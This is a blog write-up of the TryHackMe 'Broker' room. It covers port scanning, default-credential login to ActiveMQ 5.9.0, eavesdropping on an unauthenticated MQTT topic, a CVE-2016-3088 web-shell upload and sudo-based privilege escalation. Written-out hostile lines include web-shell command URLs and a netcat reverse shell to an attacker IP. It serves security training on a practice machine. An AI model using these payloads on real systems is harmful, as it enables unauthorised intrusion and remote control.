::: {}
# Broker Tryhackme Writeup {#broker-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Broker"
:::

::::::: {.section .e-content field="body"}
:::::: {#6803 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Broker Tryhackme Writeup {#aed9 .graf .graf--h3 .graf--leading .graf--title name="aed9"}

**This is a Writeup of Tryhackme room "Broker"**

<figure id="c487" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lzIfeoSbAf7f5cSk.png"
class="graf-image" data-image-id="0*lzIfeoSbAf7f5cSk.png"
data-width="453" data-height="261" data-is-featured="true" />
</figure>

**Room link:**
[https://www.tryhackme.com/room/broker](https://www.tryhackme.com/room/broker){.markup--anchor
.markup--p-anchor data-href="https://www.tryhackme.com/room/broker"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

Paul and Max found a way to chat at work by using a certain kind of
software. They think they outsmarted their boss, but do not seem to know
that eavesdropping is quite possible...They better be careful..

**Q.1:** Do a TCP portscan on all ports with port number greater than
1000 and smaller than 10000! Which TCP ports do you find to be open?
(counting up)

<figure id="5113" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*63fpyExrPa-bvHsX.png"
class="graf-image" data-image-id="0*63fpyExrPa-bvHsX.png"
data-width="612" data-height="183" />
</figure>

> ***Answer: 1883,8161***

**Q.2:** What is the name of the software they use?

<figure id="5a76" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Z2PA9hnHVUNCc5oN.png"
class="graf-image" data-image-id="0*Z2PA9hnHVUNCc5oN.png"
data-width="584" data-height="418" />
</figure>

> ***Answer: ActiveMQ***

<figure id="0a01" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*xEuSJ3UN8Ua1x8CK.png"
class="graf-image" data-image-id="0*xEuSJ3UN8Ua1x8CK.png"
data-width="875" data-height="439" />
</figure>

I try Default Credential and **admin:admin** worked for us

<figure id="8a49" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*J6kW-E0-L037uR-f.png"
class="graf-image" data-image-id="0*J6kW-E0-L037uR-f.png"
data-width="640" data-height="509" />
</figure>

noticed a version number i.e. **5.9.0**

**Q.3:** Which videogame are Paul and Max talking about?

Looking at the result above one port came back as MQTT server and the
other came back as Jetty. MQTT protocol provides a lightweight way of
both publishing and subscribing models. Basically is acts as a
lightweight messaging protocol. In our case it has null authentication
enabled meaning we can subscribe to any published message without having
any valid credentials. I decided to subscribe to any published models in
the background .

At this point it is clear that we need to talk to the daemon
`mqtt`{.markup--code .markup--p-code} running on port 1883(check nmap
scans). So searching for a `mqtt`{.markup--code .markup--p-code} client
found this:

> [*https://github.com/eclipse/paho.mqtt.python#getting-started*](https://github.com/eclipse/paho.mqtt.python#getting-started){.markup--anchor
> .markup--blockquote-anchor
> data-href="https://github.com/eclipse/paho.mqtt.python#getting-started"
> rel="noopener ugc nofollow noopener" target="_blank"}

Also found this link very useful:

> [*http://www.steves-internet-guide.com/into-mqtt-python-client/*](http://www.steves-internet-guide.com/into-mqtt-python-client/){.markup--anchor
> .markup--blockquote-anchor
> data-href="http://www.steves-internet-guide.com/into-mqtt-python-client/"
> rel="noopener ugc nofollow noopener" target="_blank"}

But we still need a "topic" for `subscribe()`{.markup--code
.markup--p-code} to subscribe to a topic and receive messages. This was
found here:

> [*http://10.10.120.228:8161/admin/xml/topics.jsp*](http://10.10.120.228:8161/admin/xml/topics.jsp){.markup--anchor
> .markup--blockquote-anchor
> data-href="http://10.10.120.228:8161/admin/xml/topics.jsp"
> rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="18be" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*jSl9EBWnp1pYLVFm.png"
class="graf-image" data-image-id="0*jSl9EBWnp1pYLVFm.png"
data-width="755" data-height="459" />
</figure>

So edited the code from GitHub link and added the topic,IP Address of
the Target and the MQTT version which needed to be 3.1:

``` {#e154 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
pip install paho-mqtt
```

<figure id="5541" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*yEADNShB6f3X2O38.png"
class="graf-image" data-image-id="0*yEADNShB6f3X2O38.png"
data-width="872" data-height="635" />
</figure>

<figure id="d5e6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*drn4TVc7hPQa1XzD.png"
class="graf-image" data-image-id="0*drn4TVc7hPQa1XzD.png"
data-width="875" data-height="221" />
</figure>

> ***Answer: Hacknet***

Now we need to exploit some vulnerability in this version of ActiveMQ to
move forward. Searchsploit revealed a vulnerability which was also
applicable for 5.9.0.

<figure id="80b7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pNKQHghhWxRz1Gi0.png"
class="graf-image" data-image-id="0*pNKQHghhWxRz1Gi0.png"
data-width="1250" data-height="222" />
</figure>

For some reason the Metasploit module for exploration doesn't work so
search around for any exploit available and found this one on GitHub:

> [*https://github.com/gsheller/ActiveMQ_putshell-CVE-2016-3088*](https://github.com/gsheller/ActiveMQ_putshell-CVE-2016-3088){.markup--anchor
> .markup--blockquote-anchor
> data-href="https://github.com/gsheller/ActiveMQ_putshell-CVE-2016-3088"
> rel="noopener ugc nofollow noopener" target="_blank"}

It was pretty simple to run:

<figure id="4701" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xAvAzRA-TeSaF8lN.png"
class="graf-image" data-image-id="0*xAvAzRA-TeSaF8lN.png"
data-width="648" data-height="360" />
</figure>

And this put a web shell at
[http://broker.thm:8161/admin/guo.jsp](http://10.10.120.228:8161/admin/guo.jsp){.markup--anchor
.markup--p-anchor data-href="http://10.10.120.228:8161/admin/guo.jsp"
rel="noopener ugc nofollow noopener" target="_blank"} and used it like
[http://](http://10.10.120.228:8161/admin/guo.jsp?pwd=gshell&shell=whoami){.markup--anchor
.markup--p-anchor
data-href="http://10.10.120.228:8161/admin/guo.jsp?pwd=gshell&shell=whoami"
rel="noopener ugc nofollow noopener"
target="_blank"}[broker.thm](http://10.10.120.228:8161/admin/guo.jsp){.markup--anchor
.markup--p-anchor data-href="http://10.10.120.228:8161/admin/guo.jsp"
rel="noopener ugc nofollow noopener"
target="_blank"}[:8161/admin/guo.jsp?pwd=gshell&shell=](http://10.10.120.228:8161/admin/guo.jsp?pwd=gshell&shell=whoami){.markup--anchor
.markup--p-anchor
data-href="http://10.10.120.228:8161/admin/guo.jsp?pwd=gshell&shell=whoami"
rel="noopener ugc nofollow noopener" target="_blank"}uname -a to get the
Remote Code Execution

<figure id="2634" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*P8PerU-Sxl-B8Ijx.png"
class="graf-image" data-image-id="0*P8PerU-Sxl-B8Ijx.png"
data-width="793" data-height="297" />
</figure>

### Reverse Shell {#0504 .graf .graf--h3 .graf-after--figure name="0504"}

Now to gain a reverse shell tried few payload and this one worked which
gave us a reverse. Note start a netcat listener on the attacking machine
before executing the reverse shell payload URL and also replace the IP
address with your own IP address:

start listener on netcat

``` {#8059 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvp 4444
```

> *nc 10.2.12.26 4444 -e /bin/sh*

<figure id="a8eb" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*7GTj7Vm7dHwfalvM.png"
class="graf-image" data-image-id="0*7GTj7Vm7dHwfalvM.png"
data-width="733" data-height="158" />
</figure>

<figure id="12fb" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*-bozUxlzbJU7MheA.png"
class="graf-image" data-image-id="0*-bozUxlzbJU7MheA.png"
data-width="626" data-height="162" />
</figure>

**Upgrade and Stabilize Shell\**
*Run the following commands on the target to upgrade current shell:*

> *script -qc /bin/bash /dev/null\
> export TERM=xterm*

**flag.txt**

<figure id="925a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*K625yzViPyC2C98G.png"
class="graf-image" data-image-id="0*K625yzViPyC2C98G.png"
data-width="651" data-height="251" />
</figure>

### Privilege Escalation {#22bf .graf .graf--h3 .graf-after--figure name="22bf"}

Running `sudo -l`{.markup--code .markup--p-code} indicated that we can
run `subcribe.py`{.markup--code .markup--p-code} in the
`/opt/apache-activemq-5.9.0`{.markup--code .markup--p-code} directory.
Also on this file the current user activemq has write permissions

<figure id="4cbd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*fAkRPi7--7KIQDVP.png"
class="graf-image" data-image-id="0*fAkRPi7--7KIQDVP.png"
data-width="841" data-height="212" />
</figure>

So we can easily get root by adding the following code in
`subcribe.py`{.markup--code .markup--p-code} using nano as vi was not
available on the target:

<figure id="5676" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*drXLrSxPOj2F-2uR.png"
class="graf-image" data-image-id="0*drXLrSxPOj2F-2uR.png"
data-width="875" data-height="272" />
</figure>

<figure id="6919" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*RbrNLAwwyhmca_Jh.png"
class="graf-image" data-image-id="0*RbrNLAwwyhmca_Jh.png"
data-width="875" data-height="194" />
</figure>

We Got **Root.txt**

### Promote and Collaborate on Cybersecurity Insights {#3ca1 .graf .graf--h3 .graf-after--p name="3ca1"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#3067 .graf .graf--h3 .graf-after--p name="3067"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 17, 2024](https://medium.com/p/b77b503e6a71).

[Canonical
link](https://medium.com/@bevijaygupta/broker-tryhackme-writeup-b77b503e6a71){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
